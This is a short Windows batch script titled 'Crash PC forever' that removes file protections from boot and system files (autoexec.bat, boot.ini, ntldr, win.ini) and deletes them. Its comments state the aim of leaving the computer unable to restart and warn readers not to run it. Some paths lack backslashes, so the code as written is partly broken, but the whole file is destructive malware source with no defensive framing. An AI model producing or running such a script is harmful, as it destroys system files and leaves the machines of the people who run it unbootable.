rem Crash PC forever
@echo off

attrib -r -s -h c:autoexec.bat
del c:autoexec.bat

attrib -r -s -h c:boot.ini
del c:boot.ini

attrib -r -s -h c:ntldr
del c:ntldr

attrib -r -s -h c:windowswin.ini
del c:windowswin.ini

rem This should shut down the person's computer.
rem It shuts it off once and deletes the files needed to reboot and restart
rem DO NOT CLICK THIS
